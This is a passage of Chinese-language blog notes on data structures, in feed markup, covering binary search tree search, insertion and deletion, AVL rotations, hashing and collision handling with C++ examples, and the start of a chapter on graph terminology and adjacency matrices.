class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data.key==key)</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        <span class="keyword">if</span>(key&lt;p-&gt;data.key)</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        <span class="keyword">else</span> p=p-&gt;rch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    BiTree T=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">    T-&gt;data.key=<span class="number">45</span>;</span><br><span class="line">    T-&gt;lch=<span class="built_in">createNode</span>(<span class="number">12</span>);</span><br><span class="line">    T-&gt;lch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">3</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">37</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">24</span>);</span><br><span class="line">    T-&gt;rch=<span class="built_in">createNode</span>(<span class="number">53</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">100</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">61</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">90</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">78</span>);</span><br><span class="line">    <span class="comment">//创建了如图的二叉排序树</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">SearchBST</span>(T, <span class="number">24</span>)-&gt;data.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>算法分析</p><p>1.二叉排序树平均查找长度的嘴擦情况与顺序表相同（关键字有序）为$O(n)$</p><p>2.最好情况与折半查找相同，是$O(\log_2{n})$数量级</p><p>3.二叉排序树的平均查找长度是$O(\log_2{n})$</p><p>若，以中序对二叉查找树遍历，特点为：按关键字升序排序</p><h5 id="二叉排序树的结点插入"><a href="#二叉排序树的结点插入" class="headerlink" title="二叉排序树的结点插入"></a>二叉排序树的结点插入</h5><p>算法思想</p><p>1.若二叉树为空，则待插入结点s作为根结点</p><p>2.当二叉排序树非空时：</p><p>将待插结点关键字与根结点进行比较，</p><p>若相等则树中已有此结点，无需插入；</p><p>若小于根结点，插入左子树；</p><p>若大于根结点，插入右子树。</p><p>算法实现</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">    <span class="comment">//  其他信息</span></span><br><span class="line">&#125;TElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BiTNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span> *lch,*rch;</span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BiTNode</span>* <span class="built_in">createNode</span>(<span class="type">int</span> value) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span>* newNode = (BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> BiTNode));</span><br><span class="line">    newNode-&gt;data.key = value;</span><br><span class="line">    newNode-&gt;lch = <span class="literal">NULL</span>;</span><br><span class="line">    newNode-&gt;rch = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> newNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BiTree <span class="title">SearchBST</span><span class="params">(BiTree T,KeyType key)</span></span>&#123;</span><br><span class="line">    BiTree p=T;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data.key==key)</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        <span class="keyword">if</span>(key&lt;p-&gt;data.key)</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        <span class="keyword">else</span> p=p-&gt;rch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SearchBST</span><span class="params">(BiTree T,KeyType key ,BiTree f,BiTree &amp;p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!T)&#123;p=f;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key==T-&gt;data.key)&#123;p=T;<span class="keyword">return</span> <span class="number">1</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key&lt;T-&gt;data.key) <span class="keyword">return</span> <span class="built_in">SearchBST</span>(T-&gt;lch,key,T,p);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">SearchBST</span>(T-&gt;rch, key,T,p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertBST</span><span class="params">(BiTree &amp;T,TElemType e)</span></span>&#123;</span><br><span class="line">    BiTree p,s;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">SearchBST</span>(T, e.key,<span class="literal">NULL</span>,p))&#123;</span><br><span class="line">        s=(BiTree)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">        s-&gt;data=e;</span><br><span class="line">        s-&gt;lch=s-&gt;rch=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span>(!p) T=s;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(e.key&lt;p-&gt;data.key)</span><br><span class="line">            p-&gt;lch=s;</span><br><span class="line">        <span class="keyword">else</span> p-&gt;rch=s;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertBST_D</span><span class="params">(TElemType e,BiTree &amp;T)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        T=(BiTree)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">        T-&gt;data=e;</span><br><span class="line">        T-&gt;lch=T-&gt;rch=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(e.key&lt;T-&gt;data.key)&#123;</span><br><span class="line">        <span class="built_in">InsertBST_D</span>(e, T-&gt;lch);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(e.key&gt;T-&gt;data.key)&#123;</span><br><span class="line">        <span class="built_in">InsertBST_D</span>(e, T-&gt;rch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    BiTree T=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">    T-&gt;data.key=<span class="number">45</span>;</span><br><span class="line">    T-&gt;lch=<span class="built_in">createNode</span>(<span class="number">12</span>);</span><br><span class="line">    T-&gt;lch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">3</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">37</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">24</span>);</span><br><span class="line">    T-&gt;rch=<span class="built_in">createNode</span>(<span class="number">53</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">100</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">61</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">90</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">78</span>);</span><br><span class="line">    <span class="comment">//创建了如图的二叉排序树</span></span><br><span class="line">    TElemType e;</span><br><span class="line">    e.key=<span class="number">23</span>;</span><br><span class="line">    <span class="built_in">InsertBST</span>(T, e);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">SearchBST</span>(T, <span class="number">23</span>)-&gt;data.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>算法分析</p><p>1.二叉排序树的插入算法时间复杂度与查找算法的时间复杂性相同</p><p>2.最好情况是$O(log_2{n})$;最坏情况是$O(n)$;平均情况是$O(log_2{n})$</p><p>生成一个二叉排序树的方法就是从空树开始循环调用插入算法</p><h5 id="二叉排序树的结点删除"><a href="#二叉排序树的结点删除" class="headerlink" title="二叉排序树的结点删除"></a>二叉排序树的结点删除</h5><p>定义：在二叉查找树上删除一个结点，要求删除结点后仍然保持原来二叉树的结构特点不变。</p><p>删除方法</p><p>设被删的结点为p，其双亲结点为f，则p可能有以下四种情况：</p><p>1.p为叶子结点</p><p>​    释放结点p，修改父结点f的相应结点</p><p>2.p只有左子树</p><p>​    释放结点p，p的左子树顶替p的位置</p><p>3.p只有右子树</p><p>​    释放结点p，p的右子树顶替p的结点</p><p>4.p左右子树都有</p><p>​    把左子树作为右子树中最小结点的左子树</p><p>​    或者把右子树作为左子树中最大节点的右子树</p><p>​    缺点是增加树的高度</p><p>​    改进方法：找一个结点顶替p的位置</p><p>​    这个结点满足：左子树中最大或者右子树中最小</p><h5 id="平衡二叉树的构建"><a href="#平衡二叉树的构建" class="headerlink" title="平衡二叉树的构建"></a>平衡二叉树的构建</h5><p>定义：平衡二叉树又称AVL树，一棵AVL树或者是空树，或者是具有以下性质的二叉排序树：他的所有结点的左子树和右子树的高度之差的绝对值不超过1</p><p>平衡因子的定义：任一结点的左子树的高度减去右子树的高度所得的高度差称为该结点的平衡因子BF，根据AVL树的定义，任一结点的平衡因子只能取-1，0，1。一棵平衡二叉排序树如果有n个结点，其高度可以保持在$O(\log_2n)$,平均查找长度也可以保持在$O(\log_2n)$</p><p>因为插入右子树的右子树导致不平衡，调整办法为RR旋转，实际操作是向左旋转</p><p>因为插入左子树的左子树导致不平衡，调整办法为LL旋转，实际操作是向右旋转</p><p>因为插入左子树的右子树导致不平衡，调整办法为LR旋转，实际操作是先左旋，再右旋</p><p>因为插入右子树的左子树导致不平衡，调整办法为RL旋转，实际操作是先右旋，再左旋</p><p>构造思想</p><p>在构造中，每当插入一个新结点时，首先检查是否因为插入而破坏了树的平衡性</p><p>若是，则找出其中的最小不平衡子树，在保持二叉排序树特性的前提下，调整最小不平衡子树中各结点之间的连接关系，以达到新平衡</p><p>最小不平衡子树：以离插入结点最近，平衡因子绝对值大于1的结点作为根的子树</p><p>操作实现：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">R_Rotate</span><span class="params">(BiTree &amp;p)</span></span>&#123;   <span class="comment">//LL型 右旋</span></span><br><span class="line">    BiTree lc;</span><br><span class="line">    lc=p-&gt;lch;</span><br><span class="line">    p-&gt;lch=lc-&gt;rch;</span><br><span class="line">    lc-&gt;rch=p;</span><br><span class="line">    p=lc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">L_Rotate</span><span class="params">(BiTree &amp;p)</span></span>&#123;   <span class="comment">//RR型 左旋</span></span><br><span class="line">    BiTree rc;</span><br><span class="line">    rc=p-&gt;rch;</span><br><span class="line">    p-&gt;rch=rc-&gt;lch;</span><br><span class="line">    rc-&gt;lch=p;</span><br><span class="line">    p=rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="哈希查找"><a href="#哈希查找" class="headerlink" title="哈希查找"></a>哈希查找</h3><h4 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h4><p>哈希(散列)技术：把记录(元素)的存储位置和该记录的关键字的值之间建立一种映射关系。关键字的值在这种映射下的像就是相应记录在表中的存储位置</p><p>散列技术在理想状况下查找的期望时间是$O(1)$</p><p>设U表示所有可能出现的关键字集合，K表示实际出现的关键字集合即K$\subseteq$U,F[B]是一个数组；从U到表F[B]下标集合上的一个映射h：U-&gt;{0,1,2,…,B-1}称为<strong>散列函数</strong>(哈希函数，杂凑函数)</p><p>数组F称为散列表(Hash表，杂凑表),数组中每一个单元被称为桶(bucket)</p><p>对于任意关键字k$\in$U，函数值h(k)称为k的散列地址（Hash地址，散列值，存储地址，桶号）</p><p>将结点按关键字的散列地址存储到散列表的过程称为散列</p><p>不同关键字具有相同的散列地址的现象，称为散列冲突，这两个关键字称为同义字</p><p>哈希函数的构造原则：</p><p>计算简单，散列函数不应该有很大的计算量，会降低查找效率</p><p>分布均匀：散列函数值即散列地址要尽量均匀的分布在地址空间，这样才能保证存储空间的有效利用并减少冲突</p><h4 id="哈希函数的构造方法"><a href="#哈希函数的构造方法" class="headerlink" title="哈希函数的构造方法"></a>哈希函数的构造方法</h4><h5 id="直接定址法"><a href="#直接定址法" class="headerlink" title="直接定址法"></a>直接定址法</h5><p>取关键字或关键字的某个线性函数值为哈希地址</p><p>$H(key)=a*key+b$</p><p>其中a,b为常数，又称$H(key)$为自身函数</p><p>优点：没有冲突</p><p>确定：若关键字取值跨度很大，浪费存储空间严重</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Hash</span><span class="params">(KeyType key)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> key/<span class="number">10</span><span class="number">-150</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="质数除余法"><a href="#质数除余法" class="headerlink" title="质数除余法"></a>质数除余法</h5><p>如果表长为n，取小于或等于n的最大质数m作模，关键字通过m取模运算，所得值作为散列地址</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">isPre</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=<span class="built_in">sqrt</span>(n);i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(n%i==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">FindPre</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isPre</span>(n)) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            n--;</span><br><span class="line">        &#125;<span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Hash</span><span class="params">(KeyType key,<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> key%<span class="built_in">FindPre</span>(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="处理冲突的方法"><a href="#处理冲突的方法" class="headerlink" title="处理冲突的方法"></a>处理冲突的方法</h4><h5 id="开放地址法"><a href="#开放地址法" class="headerlink" title="开放地址法"></a>开放地址法</h5><p>冲突时，在周围找一个新的空闲地址</p><p>1.线性探测再散列法：若H(key)=d的单元发生冲突，则按下列方法进行探查：</p><p>​    $h_i(k)=(h(k)+i)%n$ n是散列表长度，$1\leqslant i\leqslant n-1$</p><p>二次聚集：两个本来不冲突的非同义词，发生争夺同一个散列地址的现象称为二次聚集或堆积</p><p>开放地址法不会引起堆积现象</p><p>1利用散列函数计算出关键字为K的地址，d=H(K)如果F[d].key==K,查找成功，返回d；</p><p>2.如果F[d].key!=K，依次查找F[(d+i)%n].key,直到找到某个F[(d+j)%n].key==K，返回(d+j)%n，或者找到一个开放地址为止，或者又回到F[d]，此时则表示没找到</p><p>2.二次探测再散列法：若H(key)=d的单元发生冲突，则按照下列方法进行探查：</p><p>$h_i$(k)=(h(k)+$d_i$)%n n是散列表长度</p><p>$d_i$=$1^2$,$-1^2$,$2^2$,$-2^2$,…,$+k^2$,$-k^2$  ($k\leqslant n/2$)</p><p>$d_i$为伪随机序列，称伪随机探测再散列</p><p>3.再哈希法</p><p>设置多个哈希函数，冲突时顺序用下一个</p><h5 id="链地址法"><a href="#链地址法" class="headerlink" title="链地址法"></a>链地址法</h5><p>1.根据关键字K找到关键字为K的结点所在的单链表的手地址</p><p>2.在所找到的单链表上进行顺序查找，若找到，返回地址，否则返回空值</p><p>一个哈希查找的例子</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNSUCCESS 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DUPLICATE -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NULLKEY INT_MAX</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> hashsize[]=&#123;<span class="number">13</span>&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ElemType</span>&#123;</span><br><span class="line">    <span class="type">int</span> key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    ElemType *elem;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="type">int</span> sizeindex;</span><br><span class="line">&#125;HashTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isPre</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=<span class="built_in">sqrt</span>(n);i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(n%i==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">FindPre</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isPre</span>(n)) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            n--;</span><br><span class="line">        &#125;<span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Hash</span><span class="params">(KeyType key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> key%<span class="built_in">FindPre</span>(hashsize[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">collision</span><span class="params">(<span class="type">int</span> &amp;p,<span class="type">int</span> &amp;c)</span></span>&#123;</span><br><span class="line">    p=(p+c)%hashsize[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SearchHash</span><span class="params">(HashTable H,KeyType K,<span class="type">int</span> &amp;p,<span class="type">int</span> &amp;c)</span></span>&#123;</span><br><span class="line">    p=<span class="built_in">Hash</span>(K);</span><br><span class="line">    <span class="keyword">while</span>(H.elem[p].key!=NULLKEY&amp;&amp;K!=H.elem[p].key)</span><br><span class="line">        <span class="built_in">collision</span>(p,++c);</span><br><span class="line">    <span class="keyword">if</span>(K==H.elem[p].key) <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> UNSUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    HashTable HT;</span><br><span class="line">    HT.count=<span class="number">13</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> c ,p;</span><br><span class="line">    HT.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ElemType)*<span class="number">13</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">13</span>;i++)&#123;</span><br><span class="line">        HT.elem[i].key=NULLKEY;</span><br><span class="line">    &#125;</span><br><span class="line">    HT.elem[<span class="number">0</span>].key=NULLKEY;</span><br><span class="line">    HT.elem[<span class="number">1</span>].key=<span class="number">14</span>;</span><br><span class="line">    HT.elem[<span class="number">2</span>].key=<span class="number">1</span>;</span><br><span class="line">    HT.elem[<span class="number">3</span>].key=<span class="number">68</span>;</span><br><span class="line">    HT.elem[<span class="number">4</span>].key=<span class="number">27</span>;</span><br><span class="line">    HT.elem[<span class="number">5</span>].key=<span class="number">54</span>;</span><br><span class="line">    HT.elem[<span class="number">6</span>].key=<span class="number">19</span>;</span><br><span class="line">    HT.elem[<span class="number">7</span>].key=<span class="number">20</span>;</span><br><span class="line">    HT.elem[<span class="number">8</span>].key=<span class="number">84</span>;</span><br><span class="line">    HT.elem[<span class="number">9</span>].key=NULLKEY;</span><br><span class="line">    HT.elem[<span class="number">10</span>].key=<span class="number">23</span>;</span><br><span class="line">    HT.elem[<span class="number">11</span>].key=<span class="number">11</span>;</span><br><span class="line">    HT.elem[<span class="number">12</span>].key=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">13</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(HT.elem[i].key==NULLKEY)&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;@&quot;</span>&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;HT.elem[i].key&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    c=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">SearchHash</span>(HT, <span class="number">23</span>, p, c);</span><br><span class="line">    cout&lt;&lt;p&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>几种不同处理冲突方法的平均查找长度：</p><p><img src="/2023/11/21/平均查找长度比较.png" alt="平均查找长度比较"></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 图</title>
      <link href="/2023/11/21/"/>
      <url>/2023/11/21/</url>
      
        <content type="html"><![CDATA[<h3 id="图的定义和术语"><a href="#图的定义和术语" class="headerlink" title="图的定义和术语"></a>图的定义和术语</h3><h4 id="图的定义"><a href="#图的定义" class="headerlink" title="图的定义"></a>图的定义</h4><p>图G由两个集合构成，记作<code>G=&lt;V,E&gt;</code> ，其中V是顶点的非空有限集合，E是边的有限集合，其中边是顶点的无序对或有序对集合。</p><h4 id="图的术语"><a href="#图的术语" class="headerlink" title="图的术语"></a>图的术语</h4><p>无向图：若图G中所有边是无向边，则G为无向图</p><p>有向图：若所有边是有向边，则G为有向图；有向边被称作弧。</p><p>无向完全图：无向图且边数为n(n-1)/2</p><p>有向完全图：有向图且边数为n(n-1)</p><p>邻接点：边的两个顶点</p><p>关联边：若边e=(v,u)，则称顶点v，u关联边e</p><p>顶点的度：一个顶点的度是与它关联的边的条数</p><p>入度：以该顶点为终点的有向边的条数，ID(v)</p><p>出度：以该顶点为起点的有向边的条数，OD(v)</p><p><strong>顶点数、边数e、和度数D(v)的关系</strong>：e=$\sum_{i=1}^nD(V_i)$/2</p><p>无向图的路径、回路：</p><p>无向图G=(V,E)中的顶点序列$v_1$,$v_2$,…,$v_k$,若($v_i$,$v_{i+1}$) $\in$ E(i=1,2,…,k-1),$v=v_1$,$u=v_k$,则称该序列是从v到u的路径；若v=u，则该序列称为回路。</p><p>有向图的路径、回路：</p><p>有向图G=(V,E)中的顶点序列$v_1$,$v_2$,…,$v_k$,若&lt;$v_i$,$v_{i+1}$&gt; $\in$ E(i=1,2,…,k-1),$v=v_1$,$u=v_k$,则称该序列是从v到u的路径；若v=u，则该序列称为回路。</p><p>简单路径：序列顶点中不重复出现的路径</p><p>简单回路/环：在一条路径中，除起点和终点外所有顶点各不相同</p><p>连通图：在无向图G=<V,E>中，若对于任何两个顶点v,u都存在v到u的路径，则称G是连通图。</V,E></p><p>强连通图：在有向图G=<V,E>中，若对于任何两个顶点v,u都存在v到u的路径，则称G是连通图。</V,E></p><p>子图：设有两个图G=(V,E)、$G_1=(V_1,E_1)$，若$V_1$ $\subseteq$V，$E_1$ $\subseteq$E，$E_1$关联的顶点都在$V_1$中，称$G_1$是G的子图。</p><p>连通分量：无向图中的极大连通子图</p><p>强连通分量：有向图中的极大强连通子图</p><p>网络(边带权图)：某些图的边具有与它相关的数，称为权，这种带权图叫网络</p><p>生成树：连通图的一个子图如果是一棵包含G所有顶点的树，则称为图G的生成树</p><p><img src="/2023/11/21/图分类.png" alt="图分类"></p><h4 id="图的抽象数据类型定义"><a href="#图的抽象数据类型定义" class="headerlink" title="图的抽象数据类型定义"></a>图的抽象数据类型定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ADT Graph&#123;</span><br><span class="line">数据对象V:V是具有相同特性的元素的集合称为顶点集。</span><br><span class="line">数据关系: R=&#123;VR&#125;</span><br><span class="line"> VR=&#123;&lt;v,w&gt;|v,w属于V且P(v,w),&lt;v,w&gt;表示从v到w的弧&#125;</span><br><span class="line">基本操作:</span><br><span class="line">  CreateGraph(&amp;G)<span class="comment">//建立图</span></span><br><span class="line">  DestoryGraph(&amp;G)<span class="comment">//销毁图</span></span><br><span class="line">  InsertVex(&amp;G,v)<span class="comment">//插入顶点</span></span><br><span class="line">  DeleteVex(&amp;G,v)<span class="comment">//删除顶点</span></span><br><span class="line">  DFSTraverse(G,v,visit())<span class="comment">//深度优先搜索</span></span><br><span class="line">  BFSTraverse(G,v,visit())  <span class="comment">//广度优先搜索</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图的存储结构"><a href="#图的存储结构" class="headerlink" title="图的存储结构"></a>图的存储结构</h3><h4 id="数组表示法-邻接矩阵"><a href="#数组表示法-邻接矩阵" class="headerlink" title="数组表示法(邻接矩阵)"></a>数组表示法(邻接矩阵)</h4><p>G的邻接矩阵满足以下条件：</p><script type="math/tex; mode=display">A[i][j]=\begin{cases}1 ,若(v_i,v_j)\in E或<v_i,v_j>\in E\\0 ,否则\end{cases}</script><p>​    邻接矩阵中的元素A[i] [j]存放的是顶点i到顶点j的关系的信息。</p><h5 id="对于无向图"><a href="#对于无向图" class="headerlink" title="对于无向图"></a>对于无向图</h5><p>无向图的邻接矩阵特点：1.对称矩阵 2.对角线元素全0</p><p>无向图的第i个顶点的度怎么表示？ 第i行(或第i列)的非零元素个数之和</p><p>图的总度数：矩阵中非零元素个数之和</p><p>边数为总度数的一半。</p><h5 id="对于有向图"><a href="#对于有向图" class="headerlink" title="对于有向图"></a>对于有向图</h5><p>第i个顶点的出度和入度如何体现？</p><p>第i行的非零元个数之和为出度</p><p>第i列的非零元个数之和为入度</p><p>边数为非零元的个数</p><h5 id="网络的邻接矩阵"><a href="#网络的邻接矩阵" class="headerlink" title="网络的邻接矩阵"></a>网络的邻接矩阵</h5><script type="math/tex; mode=display">A[i][j]=\begin{cases}Wij ,若(v_i,v_j)\in E或<v_i,v_j>\in E\\\infty ,否则\end{cases}</script><p>对于无穷大，可以用INT_MAX表示(用一个特殊的数表示即可)</p><p>存储结构：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span 